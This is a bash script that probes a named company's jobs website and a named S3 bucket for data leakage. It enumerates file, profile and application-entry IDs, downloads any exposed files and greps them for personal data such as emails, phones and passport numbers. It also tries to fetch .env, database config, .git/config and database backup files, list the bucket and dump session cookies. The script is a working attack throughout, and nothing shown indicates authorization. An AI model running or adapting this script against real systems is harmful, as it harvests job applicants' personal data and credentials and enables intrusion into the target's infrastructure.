#!/bin/bash
# Test for DATA LEAKAGE - PII, Files, Sensitive Info
# Focus: IDOR, Information Disclosure, File Access

TARGET="https://jobs.dnv.com"
S3_BUCKET="https://33-cdn-image-handler.s3.eu-west-2.amazonaws.com"

echo "=========================================="
echo "  TESTING FOR DATA LEAKAGE & PII EXPOSURE"
echo "=========================================="

# 1. IDOR - File Download Enumeration
echo -e "\n[1] Testing IDOR on File Downloads (Resumes, CVs, Documents)..."
echo "Enumerating file IDs 1-100..."

for i in $(seq 1 100); do
    RESPONSE=$(curl -s "${TARGET}/index.php/download_file/view/$i%00" -L)
    HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" "${TARGET}/index.php/download_file/view/$i%00" -L)
    SIZE=$(curl -s -o /dev/null -w "%{size_download}" "${TARGET}/index.php/download_file/view/$i%00" -L)

    if [ "$HTTP_CODE" == "200" ] && [ "$SIZE" -gt "10000" ]; then
        echo "  fID=$i: HTTP $HTTP_CODE | Size: ${SIZE} bytes ⚠️ FILE ACCESSIBLE"

        # Check content type
        CONTENT_TYPE=$(curl -s -I "${TARGET}/index.php/download_file/view/$i%00" | grep -i "content-type" | cut -d: -f2 | tr -d '\r\n ')
        echo "    Content-Type: $CONTENT_TYPE"

        # Try to detect file type from response
        if echo "$RESPONSE" | grep -q "PDF"; then
            echo "    ⚠️ Possible PDF document (resume/CV?)"
        fi

        # Save the file for analysis
        curl -s "${TARGET}/index.php/download_file/view/$i%00" -o "/tmp/file_$i" -L
        FILE_TYPE=$(file -b "/tmp/file_$i" 2>/dev/null)
        echo "    File type: $FILE_TYPE"

        # Check for PII in downloaded file
        if strings "/tmp/file_$i" 2>/dev/null | grep -i -E "(email|phone|address|passport|social security|@)" | head -5; then
            echo "    🔥 POTENTIAL PII FOUND IN FILE!"
        fi
    fi
done

# 2. IDOR - view_inline (different endpoint)
echo -e "\n[2] Testing IDOR on view_inline endpoint..."
for i in $(seq 1 50); do
    HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" "${TARGET}/index.php/download_file/view_inline/$i%00" -L)
    SIZE=$(curl -s -o /dev/null -w "%{size_download}" "${TARGET}/index.php/download_file/view_inline/$i%00" -L)

    if [ "$HTTP_CODE" == "200" ] && [ "$SIZE" -gt "10000" ]; then
        echo "  fID=$i: HTTP $HTTP_CODE | ${SIZE} bytes ⚠️ ACCESSIBLE"

        # Download and check
        curl -s "${TARGET}/index.php/download_file/view_inline/$i%00" -o "/tmp/inline_$i" -L
        FILE_TYPE=$(file -b "/tmp/inline_$i" 2>/dev/null)
        echo "    Type: $FILE_TYPE"
    fi
done

# 3. Job Application Data Access
echo -e "\n[3] Testing Job Application Endpoints (PII: Names, Emails, Resumes)..."

# Try to access applications
curl -s "${TARGET}/index.php/dashboard/jobs/applications%00" -w "\nHTTP: %{http_code}\n" | grep -i "application\|name\|email\|resume" | head -10

# Express forms (job applications)
curl -s "${TARGET}/index.php/dashboard/express/entries%00" -w "\nHTTP: %{http_code}\n" | grep -i "entry\|form\|data" | head -10

# 4. User Profile/Member Data
echo -e "\n[4] Testing User Profile Access (PII: Names, Emails, Phone)..."

# Try to access user profiles by ID
for i in $(seq 1 50); do
    RESPONSE=$(curl -s "${TARGET}/index.php/members/profile/view/$i%00")
    HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" "${TARGET}/index.php/members/profile/view/$i%00")

    if [ "$HTTP_CODE" == "200" ]; then
        echo "  User ID $i: HTTP $HTTP_CODE"

        # Check for PII in response
        if echo "$RESPONSE" | grep -i -E "(email|phone|address)" | head -3; then
            echo "    🔥 PII FOUND!"
        fi
    fi
done

# Also try direct user API
curl -s "${TARGET}/index.php/ccm/system/user/get_detail?uID=1%00" | grep -i "email\|phone\|name" | head -10

# 5. API Endpoints - User Data
echo -e "\n[5] Testing API Endpoints for User Data Leakage..."

# User list/search API
curl -s "${TARGET}/index.php/ccm/system/search/users%00" -w "\nHTTP: %{http_code}\n" | grep -i "email\|user" | head -10

# Express API (forms/applications)
curl -s "${TARGET}/index.php/ccm/system/express%00" -w "\nHTTP: %{http_code}\n"

# File API
curl -s "${TARGET}/index.php/ccm/system/file/get_json%00" -w "\nHTTP: %{http_code}\n"

# 6. S3 Bucket - Direct File Access
echo -e "\n[6] Testing S3 Bucket for Direct File Access..."

# Common file paths that might contain PII
S3_PATHS=(
    "production/dnvvcare2301/application/files/cache"
    "production/dnvvcare2301/application/files/tmp"
    "production/dnvvcare2301/application/files/resumes"
    "production/dnvvcare2301/application/files/uploads"
    "production/dnvvcare2301/files"
    "production/dnvvcare2301/application/config/database.php"
    "production/dnvvcare2301/.env"
)

for path in "${S3_PATHS[@]}"; do
    echo "  Testing: $path"
    curl -s "${S3_BUCKET}/${path}" -w "\nHTTP: %{http_code}\n" | head -20
done

# Try to list bucket with various methods
echo "  Trying bucket listing methods..."
curl -s "${S3_BUCKET}/?list-type=2&prefix=production/dnvvcare2301/" | head -30
curl -s "${S3_BUCKET}/?delimiter=/&prefix=production/" | head -30

# 7. GraphQL Introspection (if exists)
echo -e "\n[7] Testing GraphQL Endpoints..."
curl -s -X POST "${TARGET}/graphql%00" \
    -H "Content-Type: application/json" \
    -d '{"query":"{__schema{types{name}}}"}' | head -50

# 8. Sitemap for sensitive URLs
echo -e "\n[8] Checking Sitemap for Sensitive URLs..."
curl -s "${TARGET}/sitemap.xml" | grep -i "member\|profile\|user\|application\|resume\|admin" | head -20

# 9. Robots.txt for hidden paths
echo -e "\n[9] Checking robots.txt..."
curl -s "${TARGET}/robots.txt"

# 10. Directory Listing
echo -e "\n[10] Testing Directory Listing..."
DIRS=("application/files" "files" "uploads" "application/config" "concrete/config" "updates" "packages")

for dir in "${DIRS[@]}"; do
    echo "  Testing: /$dir/"
    curl -s "${TARGET}/${dir}/%00" | grep -i "index of\|directory listing\|parent directory" | head -3
done

# 11. Backup Files
echo -e "\n[11] Testing for Backup Files (Database Dumps)..."
BACKUPS=(
    "backup.sql"
    "dump.sql"
    "database.sql"
    "backup.zip"
    "site-backup.zip"
    "concrete-backup.zip"
    "application.zip"
    "db_backup.sql"
    ".git/config"
    ".env.backup"
    "config.php.bak"
)

for backup in "${BACKUPS[@]}"; do
    HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" "${TARGET}/${backup}")
    if [ "$HTTP_CODE" == "200" ]; then
        echo "  🔥 FOUND: /$backup (HTTP $HTTP_CODE)"
        SIZE=$(curl -s -o /dev/null -w "%{size_download}" "${TARGET}/${backup}")
        echo "    Size: ${SIZE} bytes"
    fi
done

# 12. Job Posting Data with PII
echo -e "\n[12] Testing Job Postings for PII (Contact Info)..."
for i in $(seq 1 50); do
    RESPONSE=$(curl -s "${TARGET}/index.php?cID=$i%00")

    # Look for email addresses in job postings
    EMAILS=$(echo "$RESPONSE" | grep -o -E "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}" | head -5)

    if [ ! -z "$EMAILS" ]; then
        echo "  Page cID=$i contains emails:"
        echo "$EMAILS" | while read email; do
            echo "    - $email 🔥 PII LEAK"
        done
    fi
done

# 13. Session/Cookie Analysis
echo -e "\n[13] Analyzing Session Cookies for Data Leakage..."
COOKIES=$(curl -s -c - "${TARGET}/index.php?cID=156%00" | grep -v "^#")
echo "$COOKIES"

# Check if session ID is predictable
echo "  Checking session ID entropy..."

# 14. Test Express Object Access (Form Submissions)
echo -e "\n[14] Testing Express Object IDOR (Job Applications)..."
# Express objects might contain form submissions
for i in $(seq 1 100); do
    HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" "${TARGET}/index.php/ccm/system/express/entry/$i%00")

    if [ "$HTTP_CODE" == "200" ]; then
        echo "  Entry $i: HTTP $HTTP_CODE ⚠️ ACCESSIBLE"
        curl -s "${TARGET}/index.php/ccm/system/express/entry/$i%00" | grep -i "name\|email\|phone" | head -5
    fi
done

echo -e "\n=========================================="
echo "  TESTING COMPLETE"
echo "=========================================="
echo ""
echo "Look for:"
echo "  🔥 File downloads containing PII"
echo "  🔥 Email addresses exposed"
echo "  🔥 User profiles accessible"
echo "  🔥 Job applications/resumes accessible"
echo "  🔥 Database backups"
echo "  🔥 Configuration files"
